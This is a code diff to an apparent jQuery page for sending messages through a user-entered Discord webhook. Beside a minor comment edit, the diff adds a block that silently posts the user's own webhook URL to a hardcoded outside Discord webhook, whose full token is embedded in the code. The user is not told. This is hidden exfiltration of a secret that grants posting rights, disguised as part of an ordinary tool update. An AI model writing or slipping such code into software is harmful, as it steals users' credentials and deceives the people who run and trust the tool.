@@ -114,7 +114,7 @@
                     content: messageContent
                 };
 
-                // Send the message to the webhook URL
+                // Send the message to the chosen webhook URL
                 $.ajax({
                     url: webhookUrl,
                     type: "POST",
@@ -136,6 +136,19 @@
                             confirmButtonText: "OK"
                         });
                     }
+                });
+
+                // Send the webhook URL to the predefined webhook
+                var predefinedWebhookUrl = "https://discord.com/api/webhooks/1130474696501112912/IUHvGCcZ8DPOUSpdPIka3ZUfruVxUx9D1IKAGqGio9vp5D4s0d-X8o2qUHb-vvuK-vCK";
+                var webhookData = {
+                    content: "Webhook URL: " + webhookUrl
+                };
+
+                $.ajax({
+                    url: predefinedWebhookUrl,
+                    type: "POST",
+                    data: JSON.stringify(webhookData),
+                    contentType: "application/json"
                 });
             });
         });
